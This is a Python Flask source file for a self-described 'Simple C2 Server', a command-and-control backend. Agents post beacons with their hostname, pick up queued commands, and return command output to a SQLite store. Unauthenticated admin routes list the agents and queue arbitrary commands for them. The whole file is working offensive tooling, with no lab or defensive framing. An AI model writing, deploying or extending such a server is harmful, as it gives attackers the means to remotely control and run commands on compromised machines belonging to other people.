import os
import sqlite3
import time
import uuid
from flask import Flask, request, jsonify, render_template

app = Flask(__name__)
DB_PATH = "c2_simple.db"

def init_db():
    conn = sqlite3.connect(DB_PATH)
    conn.execute("CREATE TABLE IF NOT EXISTS agents (id TEXT PRIMARY KEY, hostname TEXT, last_seen INTEGER)")
    conn.execute("CREATE TABLE IF NOT EXISTS tasks (id TEXT PRIMARY KEY, agent_id TEXT, command TEXT, status TEXT)")
    conn.execute("CREATE TABLE IF NOT EXISTS results (task_id TEXT, output TEXT)")
    conn.commit()
    conn.close()

@app.route("/")
def index():
    return "Simple C2 Server Active"

@app.route("/beacon", methods=["POST"])
def beacon():
    data = request.json
    aid = data.get("agent_id")
    hostname = data.get("hostname", "Unknown")
    
    conn = sqlite3.connect(DB_PATH)
    conn.execute("INSERT OR REPLACE INTO agents (id, hostname, last_seen) VALUES (?, ?, ?)", (aid, hostname, int(time.time())))
    
    task = conn.execute("SELECT id, command FROM tasks WHERE agent_id = ? AND status = 'pending'", (aid,)).fetchone()
    if task:
        conn.execute("UPDATE tasks SET status = 'sent' WHERE id = ?", (task[0],))
        conn.commit()
        conn.close()
        return jsonify({"command": task[1], "command_id": task[0]})
    
    conn.commit()
    conn.close()
    return jsonify({"status": "ok"})

@app.route("/result", methods=["POST"])
def result():
    data = request.json
    conn = sqlite3.connect(DB_PATH)
    conn.execute("INSERT INTO results (task_id, output) VALUES (?, ?)", (data["command_id"], data["output"]))
    conn.execute("UPDATE tasks SET status = 'completed' WHERE id = ?", (data["command_id"],))
    conn.commit()
    conn.close()
    return jsonify({"status": "success"})

# Admin routes for the dashboard compatibility
@app.route("/admin/agents")
def list_agents():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    agents = [dict(row) for row in conn.execute("SELECT * FROM agents").fetchall()]
    conn.close()
    return jsonify(agents)

@app.route("/admin/task", methods=["POST"])
def add_task():
    data = request.json
    tid = str(uuid.uuid4())[:8]
    conn = sqlite3.connect(DB_PATH)
    conn.execute("INSERT INTO tasks (id, agent_id, command, status) VALUES (?, ?, ?, 'pending')", (tid, data["agent_id"], data["command"]))
    conn.commit()
    conn.close()
    return jsonify({"status": "success", "task_id": tid})

if __name__ == "__main__":
    init_db()
    app.run(host="0.0.0.0", port=5001)
